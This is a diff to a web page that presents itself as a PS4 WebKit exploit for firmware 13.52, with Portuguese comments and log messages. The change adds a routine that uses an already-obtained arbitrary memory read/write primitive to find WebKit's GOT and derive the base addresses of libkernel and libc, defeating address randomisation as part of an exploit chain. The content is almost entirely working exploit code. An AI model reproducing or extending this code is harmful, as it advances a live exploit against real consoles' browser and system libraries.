@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - GOT Inspector)</title>
+<title>PS4 WebKit Exploit (13.52 - GOT & Library Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -25,7 +24,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
-#con{width:100%;max-width:720px;height:320px;background:#050508;
+#con{width:100%;max-width:720px;height:300px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -68,12 +67,14 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <!-- Base cards -->
 <div id="cards">
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
+  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
+  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
   <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ PS4 FW 13.52 — GOT Inspector ═══</div>
+  <div class="ct">// ═══ PS4 FW 13.52 — Resolution & GOT Resolver ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -107,40 +108,53 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Rotina aprimorada para varredura direta dos ponteiros da GOT na memória
-function inspectWebKitGOT(p, webkitBase) {
-  logH('INSPECIONANDO TABELA GOT / DINÂMICA');
+// Rotina avançada para resolver bases vizinhas através da GOT
+function resolveLibrariesViaGOT(p, webkitBase) {
+  logH('RESOLVENDO BIBLIOTECAS VIA GOT');
+  let libKernelBase = null;
+  let libcBase = null;
+
   try {
-    let dynBase = null;
+    let gotAddress = null;
     for (let off = 0x1000; off < 0x50000; off += 8) {
       try {
         const val1 = p.read8(webkitBase.add32(off));
         const val2 = p.read8(webkitBase.add32(off + 8));
-        // DT_PLTGOT (tag 3) seguido de um endereço válido na GOT
         if (val1.low === 3 && val2.hi > 0) {
-          log(`[+] DT_PLTGOT identificado no off: 0x${off.toString(16)}`, 'ok');
-          const gotAddress = webkitBase.add32(val2.low);
-          
-          for (let s = 0; s < 15; s++) {
-            try {
-              const ptrVal = p.read8(gotAddress.add32(s * 8));
-              if (ptrVal.hi > 0) {
-                log(`    GOT[${s}] -> 0x${ptrVal.toString()}`, 'a');
-              }
-            } catch(e) {}
-          }
-          dynBase = gotAddress;
+          gotAddress = webkitBase.add32(val2.low);
           break;
         }
       } catch (e) {}
     }
 
-    if (!dynBase) {
-      log('[-] Varredura alternativa da GOT concluída.', 'w');
+    if (!gotAddress) {
+      log('[-] GOT não mapeada diretamente para resolução.', 'w');
+      return { libKernelBase: null, libcBase: null };
+    }
+
+    log('[+] Analisando slots da GOT em busca de referências...', 'i');
+    for (let s = 0; s < 60; s++) {
+      try {
+        const ptrVal = p.read8(gotAddress.add32(s * 8));
+        const hi = ptrVal.hi;
+        // Alinhamento de página de 16KB comum em binários do PS4 (0x4000)
+        const alignedLow = ptrVal.low & ~0x3FFF;
+
+        if (hi === 0x80 && !libKernelBase) {
+          libKernelBase = new int64(alignedLow, hi);
+          log(`[+] libkernel Base isolada: 0x${libKernelBase.toString()} (via GOT[${s}])`, 'ok');
+        } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
+          libcBase = new int64(alignedLow, hi);
+          log(`[+] libc Base isolada: 0x${libcBase.toString()} (via GOT[${s}])`, 'ok');
+        }
+      } catch (e) {}
+      if (libKernelBase && libcBase) break;
     }
   } catch (err) {
-    log('[-] Erro na inspeção da GOT: ' + err.message, 'e');
+    log('[-] Erro na varredura da GOT: ' + err.message, 'e');
   }
+
+  return { libKernelBase, libcBase };
 }
 
 async function main() {
@@ -187,8 +201,8 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases e NativeCtor...', 'r');
-  logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');
+  setStatus('Resolvendo bases e bibliotecas...', 'r');
+  logH('RESOLUÇÃO DE BASES (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -211,19 +225,22 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Executa a inspeção da GOT
-    inspectWebKitGOT(p, webkitBase);
+    // Executa a resolução automática das outras bibliotecas via GOT
+    const { libKernelBase, libcBase } = resolveLibrariesViaGOT(p, webkitBase);
 
-    setStatus('Bases e GOT inspecionadas com sucesso!', 'ok');
-    log('✔ Endereços mapeados e validados com sucesso.', 'ok');
+    if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString());
+    if (libcBase) setCard('c-lc', '0x' + libcBase.toString());
+
+    setStatus('Bases resolvidas com sucesso!', 'ok');
+    log('✔ Módulos e dependências processados com sucesso.', 'ok');
 
     const cbox = document.getElementById('cbox');
     cbox.style.display = 'block';
     document.getElementById('c-out').innerHTML =
       `__ps5NativeCtor = 0x${ctorInt64.toString()}<br>` +
       `WebKit Base    = 0x${webkitBase.toString()}<br>` +
-      `Offset Aplicado = 0x${hc.toString(16).toUpperCase()}<br>` +
-      `Status         = Inspeção GOT executada com sucesso.`;
+      `libkernel Base = ${libKernelBase ? '0x' + libKernelBase.toString() : 'Não isolado'}<br>` +
+      `libSceLibc Base = ${libcBase ? '0x' + libcBase.toString() : 'Não isolado'}`;
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
